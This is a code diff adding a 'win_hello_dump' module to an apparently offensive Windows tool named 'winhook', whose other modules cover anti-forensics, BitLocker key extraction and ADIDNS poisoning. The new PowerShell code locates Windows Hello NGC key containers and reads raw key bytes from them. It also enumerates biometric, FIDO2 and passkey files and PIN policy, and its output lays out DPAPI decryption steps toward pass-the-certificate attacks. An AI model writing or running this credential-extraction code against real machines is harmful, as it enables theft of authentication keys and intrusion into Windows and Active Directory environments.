@@ -552,6 +552,11 @@ const PROGRAMS = {
       "Anti-forensics toolkit — timestamp stomping (modify file Created/Modified/Accessed times to blend with legitimate files), prefetch and amcache clearing (remove execution evidence), USN journal manipulation (delete change tracking records), shimcache clearing, and recent docs/jump list cleanup. Covers the major forensic artifact categories that IR teams examine",
     args: "--action stomp|prefetch|amcache|usn|shimcache|recent|full [--target PATH] [--timestamp 'YYYY-MM-DD HH:mm:ss'] [--reference PATH]",
   },
+  win_hello_dump: {
+    description:
+      "Windows Hello credential extraction — enumerate and extract Windows Hello for Business NGC keys, PIN complexity requirements, biometric enrollment status, and FIDO2 security keys. Access NGC key containers (DPAPI-protected), extract PIN-derived keys for pass-the-certificate attacks, enumerate trust relationships between Windows Hello and Azure AD/on-prem AD",
+    args: "--action enum|keys|pin-policy|biometric|fido [--user USERNAME]",
+  },
   bitlocker_keys: {
     description:
       "BitLocker recovery key extraction — retrieve BitLocker recovery keys from Active Directory (stored in msFVE-RecoveryInformation objects), local registry, WMI, and TPM metadata. Enumerate encrypted volumes on local and remote hosts, extract recovery passwords for offline disk decryption, and check for suspended protection (cleartext keys in memory)",
@@ -17655,6 +17660,282 @@ Write-Output "[*] Cleanup complete — recent activity evidence removed"
   return { output: output.join("\n"), findings }
 }
 
+async function winHelloDump(args: string[], timeout: number): Promise<HookResult> {
+  const action = argVal(args, "--action") || "enum"
+  const user = argVal(args, "--user")
+  const findings: Finding[] = []
+  const output: string[] = ["[*] Windows Hello credential extraction...\n"]
+
+  if (action === "enum") {
+    const script = `
+Write-Output "=== Windows Hello Enrollment Status ==="
+Write-Output ""
+# Check Windows Hello status via dsregcmd
+$dsreg = dsregcmd /status 2>&1
+$ngcSet = ($dsreg | Select-String 'NgcSet\s*:\s*(\w+)').Matches.Groups[1].Value
+Write-Output "NGC (Next Generation Credential) Set: $ngcSet"
+# Check Windows Hello containers
+Write-Output ""
+Write-Output "--- NGC Key Containers ---"
+$ngcPath = "$env:SystemRoot\\ServiceProfiles\\LocalService\\AppData\\Local\\Microsoft\\Ngc"
+if (Test-Path $ngcPath) {
+  $ngcDirs = Get-ChildItem $ngcPath -Directory -ErrorAction SilentlyContinue
+  Write-Output "NGC containers found: $($ngcDirs.Count)"
+  foreach ($d in $ngcDirs) {
+    Write-Output "  Container: $($d.Name)"
+    $protectorFile = Get-ChildItem "$($d.FullName)\\Protectors" -ErrorAction SilentlyContinue
+    $keyFiles = Get-ChildItem "$($d.FullName)" -Recurse -File -ErrorAction SilentlyContinue
+    Write-Output "    Files: $($keyFiles.Count)"
+    Write-Output "    Protectors: $($protectorFile.Count)"
+    Write-Output "    Created: $($d.CreationTime)"
+    Write-Output "    Modified: $($d.LastWriteTime)"
+    # Check for 1.dat (encrypted key) and 2.dat (DPAPI master key reference)
+    if (Test-Path "$($d.FullName)\\1.dat") {
+      Write-Output "    [+] NGC key data file found (1.dat)"
+    }
+  }
+} else {
+  Write-Output "NGC path not found — Windows Hello may not be configured"
+}
+# Check per-user enrollment
+Write-Output ""
+Write-Output "--- Per-User Hello Enrollment ---"
+$profiles = Get-ChildItem "$env:SystemDrive\\Users" -Directory -ErrorAction SilentlyContinue
+foreach ($p in $profiles) {
+  ${user ? `if ($p.Name -ne '${user}') { continue }` : ""}
+  $userNgc = "$($p.FullName)\\AppData\\Local\\Microsoft\\Ngc"
+  if (Test-Path $userNgc) {
+    Write-Output "  $($p.Name): Windows Hello ENROLLED"
+  }
+  # Check FIDO2 keys
+  $fidoPath = "$($p.FullName)\\AppData\\Local\\Microsoft\\Fido"
+  if (Test-Path $fidoPath) {
+    Write-Output "  $($p.Name): FIDO2 security key registered"
+  }
+}
+# Biometric status
+Write-Output ""
+Write-Output "--- Biometric Devices ---"
+$bio = Get-WmiObject -Class Win32_BiometricDevice -ErrorAction SilentlyContinue
+if ($bio) {
+  foreach ($b in $bio) {
+    Write-Output "  $($b.Caption) — $($b.Manufacturer)"
+  }
+} else {
+  # Try WinBio service
+  $winbioService = Get-Service -Name WbioSrvc -ErrorAction SilentlyContinue
+  Write-Output "WinBio Service: $(if ($winbioService) {$winbioService.Status} else {'Not found'})"
+}
+# Azure AD / WHfB Key Trust vs Certificate Trust
+Write-Output ""
+Write-Output "--- Windows Hello for Business Type ---"
+$whfbType = (Get-ItemProperty "HKLM:\\SOFTWARE\\Policies\\Microsoft\\PassportForWork" -Name "UseCloudTrustForOnPremAuth" -ErrorAction SilentlyContinue).UseCloudTrustForOnPremAuth
+$certTrust = (Get-ItemProperty "HKLM:\\SOFTWARE\\Policies\\Microsoft\\PassportForWork" -Name "UseCertificateForOnPremAuth" -ErrorAction SilentlyContinue).UseCertificateForOnPremAuth
+Write-Output "Cloud Trust: $(if ($whfbType -eq 1) {'Enabled'} else {'Disabled/Not configured'})"
+Write-Output "Certificate Trust: $(if ($certTrust -eq 1) {'Enabled'} else {'Disabled/Not configured'})"
+`
+    const r = await ps(script, timeout)
+    output.push(r.stdout)
+    if (r.stdout.includes("[+] NGC key data file found")) {
+      findings.push({
+        checkId: "HELLO-001",
+        provider: "winhook",
+        severity: "high",
+        status: "FAIL",
+        resource: "Windows Hello NGC",
+        title: "Windows Hello NGC key containers accessible",
+        details: "NGC key data files can be extracted and decrypted via DPAPI for credential recovery",
+        remediation: "Enable Credential Guard to protect NGC keys with VBS.",
+      })
+    }
+  }
+
+  if (action === "keys") {
+    const script = `
+Write-Output "=== Windows Hello Key Extraction ==="
+Write-Output ""
+# Extract NGC key material
+$ngcPath = "$env:SystemRoot\\ServiceProfiles\\LocalService\\AppData\\Local\\Microsoft\\Ngc"
+if (-not (Test-Path $ngcPath)) {
+  Write-Output "NGC path not found"
+  return
+}
+$containers = Get-ChildItem $ngcPath -Directory -ErrorAction SilentlyContinue
+foreach ($c in $containers) {
+  Write-Output "[*] Container: $($c.Name)"
+  # Read key data
+  $keyFile = "$($c.FullName)\\1.dat"
+  if (Test-Path $keyFile) {
+    $keyData = [System.IO.File]::ReadAllBytes($keyFile)
+    Write-Output "  Key data: $($keyData.Length) bytes"
+    Write-Output "  Key header: $([BitConverter]::ToString($keyData[0..15]))"
+  }
+  # Read protector info
+  $protectorDir = "$($c.FullName)\\Protectors"
+  if (Test-Path $protectorDir) {
+    $protectors = Get-ChildItem $protectorDir -Directory
+    foreach ($p in $protectors) {
+      Write-Output "  Protector: $($p.Name)"
+      $protData = Get-ChildItem "$($p.FullName)" -File -ErrorAction SilentlyContinue
+      foreach ($f in $protData) {
+        Write-Output "    $($f.Name): $($f.Length) bytes"
+      }
+    }
+  }
+  # Check CryptoAPI key containers
+  Write-Output ""
+  Write-Output "  --- Associated CNG Keys ---"
+  $cngPath = "$env:SystemRoot\\ServiceProfiles\\LocalService\\AppData\\Roaming\\Microsoft\\Crypto\\Keys"
+  if (Test-Path $cngPath) {
+    $cngKeys = Get-ChildItem $cngPath -ErrorAction SilentlyContinue | Sort-Object LastWriteTime -Descending | Select-Object -First 5
+    foreach ($k in $cngKeys) {
+      Write-Output "    $($k.Name) — $($k.Length) bytes — $($k.LastWriteTime)"
+    }
+  }
+  Write-Output ""
+}
+Write-Output "--- DPAPI Decryption ---"
+Write-Output "NGC keys are protected by DPAPI. To decrypt:"
+Write-Output "  1. Extract DPAPI master keys: winhook dpapi_extract"
+Write-Output "  2. If domain-joined: winhook dpapi_domain (domain backup key)"
+Write-Output "  3. Decrypted NGC key enables pass-the-certificate attacks"
+`
+    const r = await ps(script, timeout)
+    output.push(r.stdout)
+  }
+
+  if (action === "pin-policy") {
+    const script = `
+Write-Output "=== Windows Hello PIN Policy ==="
+Write-Output ""
+$policyPath = "HKLM:\\SOFTWARE\\Policies\\Microsoft\\PassportForWork\\PINComplexity"
+$minLength = (Get-ItemProperty $policyPath -Name "MinimumPINLength" -ErrorAction SilentlyContinue).MinimumPINLength
+$maxLength = (Get-ItemProperty $policyPath -Name "MaximumPINLength" -ErrorAction SilentlyContinue).MaximumPINLength
+$uppercase = (Get-ItemProperty $policyPath -Name "RequireUppercase" -ErrorAction SilentlyContinue).RequireUppercase
+$lowercase = (Get-ItemProperty $policyPath -Name "RequireLowercase" -ErrorAction SilentlyContinue).RequireLowercase
+$digits = (Get-ItemProperty $policyPath -Name "RequireDigits" -ErrorAction SilentlyContinue).RequireDigits
+$special = (Get-ItemProperty $policyPath -Name "RequireSpecialCharacters" -ErrorAction SilentlyContinue).RequireSpecialCharacters
+$history = (Get-ItemProperty $policyPath -Name "History" -ErrorAction SilentlyContinue).History
+$expiry = (Get-ItemProperty $policyPath -Name "Expiration" -ErrorAction SilentlyContinue).Expiration
+Write-Output "Min Length: $(if ($minLength) {$minLength} else {'4 (default)'})"
+Write-Output "Max Length: $(if ($maxLength) {$maxLength} else {'127 (default)'})"
+Write-Output "Require Uppercase: $(if ($uppercase -eq 1) {'Yes'} elseif ($uppercase -eq 2) {'No'} else {'Not configured'})"
+Write-Output "Require Lowercase: $(if ($lowercase -eq 1) {'Yes'} elseif ($lowercase -eq 2) {'No'} else {'Not configured'})"
+Write-Output "Require Digits: $(if ($digits -eq 1) {'Yes'} elseif ($digits -eq 2) {'No'} else {'Required (default)'})"
+Write-Output "Require Special: $(if ($special -eq 1) {'Yes'} elseif ($special -eq 2) {'No'} else {'Not configured'})"
+Write-Output "History: $(if ($history) {$history} else {'Not configured'})"
+Write-Output "Expiry (days): $(if ($expiry) {$expiry} else {'Never (default)'})"
+Write-Output ""
+if (-not $minLength -or $minLength -lt 6) {
+  Write-Output "[!] PIN length requirement is weak — brute force feasible"
+  Write-Output "    4-digit PIN = 10,000 combinations (trivial)"
+  Write-Output "    6-digit PIN = 1,000,000 combinations (still feasible)"
+}
+`
+    const r = await ps(script, timeout)
+    output.push(r.stdout)
+    if (r.stdout.includes("brute force feasible")) {
+      findings.push({
+        checkId: "HELLO-002",
+        provider: "winhook",
+        severity: "medium",
+        status: "FAIL",
+        resource: "Windows Hello PIN Policy",
+        title: "Weak PIN policy — brute force feasible",
+        details: "PIN length and complexity requirements are insufficient to prevent brute force",
+        remediation: "Set minimum PIN length to 6+ and require mixed character types via GPO.",
+      })
+    }
+  }
+
+  if (action === "biometric") {
+    const script = `
+Write-Output "=== Biometric Enrollment Details ==="
+Write-Output ""
+# WinBio database
+$bioDbPath = "$env:SystemRoot\\System32\\WinBioDatabase"
+if (Test-Path $bioDbPath) {
+  $bioFiles = Get-ChildItem $bioDbPath -ErrorAction SilentlyContinue
+  Write-Output "Biometric database files: $($bioFiles.Count)"
+  foreach ($f in $bioFiles) {
+    Write-Output "  $($f.Name) — $([math]::Round($f.Length/1KB, 1)) KB — $($f.LastWriteTime)"
+  }
+} else {
+  Write-Output "No biometric database found"
+}
+Write-Output ""
+# WinBio configuration
+Write-Output "--- WinBio Configuration ---"
+$bioConfig = Get-ItemProperty "HKLM:\\SYSTEM\\CurrentControlSet\\Services\\WbioSrvc" -ErrorAction SilentlyContinue
+Write-Output "Service Start: $(switch ($bioConfig.Start) {2 {'Automatic'} 3 {'Manual'} 4 {'Disabled'} default {'Unknown'}})"
+$bioSensors = Get-ItemProperty "HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\WinBio\\*" -ErrorAction SilentlyContinue
+if ($bioSensors) {
+  Write-Output "Registered sensors:"
+  foreach ($s in $bioSensors) {
+    Write-Output "  $($s.PSChildName)"
+  }
+}
+# Face recognition (Windows Hello Face)
+Write-Output ""
+Write-Output "--- Facial Recognition ---"
+$irCamera = Get-PnpDevice -Class Camera -ErrorAction SilentlyContinue | Where-Object { $_.FriendlyName -match 'IR|Infrared|Hello' }
+if ($irCamera) {
+  Write-Output "IR Camera: $($irCamera.FriendlyName) — Status: $($irCamera.Status)"
+} else {
+  Write-Output "No IR camera detected for facial recognition"
+}
+`
+    const r = await ps(script, timeout)
+    output.push(r.stdout)
+  }
+
+  if (action === "fido") {
+    const script = `
+Write-Output "=== FIDO2 Security Key Enumeration ==="
+Write-Output ""
+# Enumerate registered FIDO2 keys
+$fidoPath = "$env:LOCALAPPDATA\\Microsoft\\Fido"
+if (Test-Path $fidoPath) {
+  $fidoFiles = Get-ChildItem $fidoPath -Recurse -ErrorAction SilentlyContinue
+  Write-Output "FIDO2 registration files: $($fidoFiles.Count)"
+  foreach ($f in $fidoFiles) {
+    Write-Output "  $($f.Name) — $($f.LastWriteTime)"
+  }
+} else {
+  Write-Output "No FIDO2 registrations found for current user"
+}
+# Check WebAuthn
+Write-Output ""
+Write-Output "--- WebAuthn (Platform) ---"
+$webauthn = Get-Item "HKLM:\\SOFTWARE\\Microsoft\\WebAuthn" -ErrorAction SilentlyContinue
+if ($webauthn) {
+  Write-Output "WebAuthn registry key present"
+  $props = Get-ItemProperty $webauthn.PSPath
+  $props.PSObject.Properties | Where-Object { $_.Name -notmatch '^PS' } | ForEach-Object {
+    Write-Output "  $($_.Name): $($_.Value)"
+  }
+}
+# Check passkeys
+Write-Output ""
+Write-Output "--- Passkeys (Windows 23H2+) ---"
+$passkeysPath = "$env:LOCALAPPDATA\\Microsoft\\Passkeys"
+if (Test-Path $passkeysPath) {
+  Write-Output "Passkeys directory found"
+  $pkFiles = Get-ChildItem $passkeysPath -Recurse -ErrorAction SilentlyContinue
+  foreach ($f in $pkFiles) {
+    Write-Output "  $($f.Name)"
+  }
+} else {
+  Write-Output "No passkeys directory (Windows 23H2+ feature)"
+}
+`
+    const r = await ps(script, timeout)
+    output.push(r.stdout)
+  }
+
+  return { output: output.join("\n"), findings }
+}
+
 async function bitlockerKeys(args: string[], timeout: number): Promise<HookResult> {
   const action = argVal(args, "--action") || "local"
   const target = argVal(args, "--target")
@@ -23221,6 +23502,7 @@ const dispatch: Record<Program, (args: string[], timeout: number) => Promise<Hoo
   adidns_poison: adidnsPoison,
   machine_account: machineAccount,
   bitlocker_keys: bitlockerKeys,
+  win_hello_dump: winHelloDump,
 }
 
 export const WinhookTool = Tool.define("winhook", {
